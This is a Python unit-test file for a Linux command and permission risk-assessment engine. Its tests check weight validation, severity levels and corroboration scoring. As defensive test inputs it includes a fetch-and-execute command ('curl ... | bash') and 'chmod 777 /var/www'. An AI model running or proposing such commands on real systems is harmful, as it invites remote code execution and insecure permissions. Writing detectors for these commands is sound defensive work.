"""Unit tests for core/linux_advisor/risk_assessment.py."""

from __future__ import annotations

import pytest

from core.linux_advisor.command_analyzer import CommandAnalyzer
from core.linux_advisor.models import LinuxAdvisorSeverity
from core.linux_advisor.permission_analyzer import PermissionAnalyzer
from core.linux_advisor.permission_parser import parse_ls_permission_string
from core.linux_advisor.risk_assessment import LinuxAdvisorRiskWeights, RiskAssessmentEngine

pytestmark = pytest.mark.unit


def test_weights_must_sum_to_one() -> None:
    with pytest.raises(ValueError, match="sum to 1.0"):
        LinuxAdvisorRiskWeights(
            highest_severity=0.5,
            highest_confidence=0.5,
            finding_count=0.5,
            critical_category=0.5,
            corroboration=0.5,
        )


def test_default_weights_are_valid() -> None:
    LinuxAdvisorRiskWeights()  # must not raise


def test_no_findings_is_info_with_full_confidence() -> None:
    engine = RiskAssessmentEngine()
    risk_level, confidence, explanation, dims = engine.assess(command_risks=[], permission_risks=[])
    assert risk_level == LinuxAdvisorSeverity.INFO
    assert confidence == 1.0
    assert "no dangerous" in explanation.lower()
    assert dims.highest_severity_score == 0.0


def test_critical_command_drives_high_or_critical_overall_risk() -> None:
    """A single critical-category finding is weighted heavily but the
    composite score also factors in finding count/corroboration — a lone
    finding lands at HIGH or CRITICAL, never lower."""
    command_risk = CommandAnalyzer().analyze("curl http://example.com/x.sh | bash")
    engine = RiskAssessmentEngine()
    risk_level, _confidence, _explanation, _dims = engine.assess(
        command_risks=[command_risk], permission_risks=[]
    )
    assert risk_level in (LinuxAdvisorSeverity.HIGH, LinuxAdvisorSeverity.CRITICAL)


def test_low_severity_permission_alone_does_not_reach_critical() -> None:
    analysis = parse_ls_permission_string("-rw-rw-rw-")
    permission_risk = PermissionAnalyzer().analyze(analysis)
    engine = RiskAssessmentEngine()
    risk_level, _confidence, _explanation, _dims = engine.assess(
        command_risks=[], permission_risks=[permission_risk]
    )
    assert risk_level != LinuxAdvisorSeverity.CRITICAL


def test_corroboration_across_command_and_permission() -> None:
    command_risk = CommandAnalyzer().analyze("chmod 777 /var/www")
    analysis = parse_ls_permission_string("-rwxrwxrwx")
    permission_risk = PermissionAnalyzer().analyze(analysis)
    engine = RiskAssessmentEngine()
    _risk_level, _confidence, _explanation, dims = engine.assess(
        command_risks=[command_risk], permission_risks=[permission_risk]
    )
    assert dims.corroboration_score == 1.0


def test_no_corroboration_when_only_one_dimension_has_findings() -> None:
    command_risk = CommandAnalyzer().analyze("chmod 777 /var/www")
    engine = RiskAssessmentEngine()
    _risk_level, _confidence, _explanation, dims = engine.assess(
        command_risks=[command_risk], permission_risks=[]
    )
    assert dims.corroboration_score == 0.0
